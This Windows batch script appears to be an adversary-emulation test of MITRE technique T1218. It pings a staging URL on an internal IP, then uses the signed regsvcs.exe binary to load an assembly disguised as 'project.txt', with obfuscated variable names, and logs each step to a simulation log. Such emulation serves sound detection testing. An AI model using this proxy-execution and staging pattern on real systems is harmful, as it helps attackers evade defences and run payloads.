@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET pjkcpgw=%APPDATA%\9729\f122bfeb
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9729-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=project.txt
SET ewjmdkff=9729

SET tsvar=!DATE!/!TIME!
SET vbyrdm=0
SET pzchsv=
SET kzqwf=%APPDATA%\!pudaazx!\macula-simulations.log

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_start>> "!kzqwf!" 2>nul
curl -k -s -o nul "!drguvr!"
if !errorlevel! equ 0 (SET vbyrdm=1) else (SET vbyrdm=0)
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_result=!vbyrdm!>> "!kzqwf!" 2>nul

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_start>> "!kzqwf!" 2>nul
cd /d "!pjkcpgw!" >nul 2>&1
SET qhgpy=!errorlevel!
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_result=!qhgpy!>> "!kzqwf!" 2>nul
if not !qhgpy! equ 0 exit /b 1

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: regsvcs_start>> "!kzqwf!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe "!syjfr!" >nul 2>&1
SET vbyrdm=!errorlevel!
if !vbyrdm! equ 0 (SET vbyrdm=1 & SET pzchsv=) else (SET vbyrdm=0 & SET pzchsv=assembly_load_failed)
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: regsvcs_result=!vbyrdm!>> "!kzqwf!" 2>nul

for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set "datetime=%%I"
set "logtime=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!"
echo [!logtime!][TTP][!hlbnp!][!ewjmdkff!]: T1218|Signed Binary Proxy Execution=!vbyrdm!:!pzchsv!>> "!kzqwf!" 2>nul